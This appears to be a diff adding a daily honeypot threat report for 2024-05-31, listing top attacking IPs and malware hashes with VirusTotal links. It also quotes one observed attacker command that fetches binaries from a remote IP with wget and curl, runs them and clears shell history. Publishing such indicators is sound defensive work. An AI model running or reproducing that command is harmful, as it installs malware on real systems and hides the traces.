@@ -1,0 +1,21 @@
+Top 5 IPs for 2024-05-31 :
+
+101.71.39.187
+101.71.39.123
+41.139.176.122
+117.204.201.13
+117.254.32.244
+
+Malware Observed:
+
+File name: eyshcjdmzg
+ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
+https://www.virustotal.com/gui/file/ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
+File name: sshd
+629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76
+https://www.virustotal.com/gui/file/629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76
+
+
+Commands/exploits observed:
+
+#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c; 
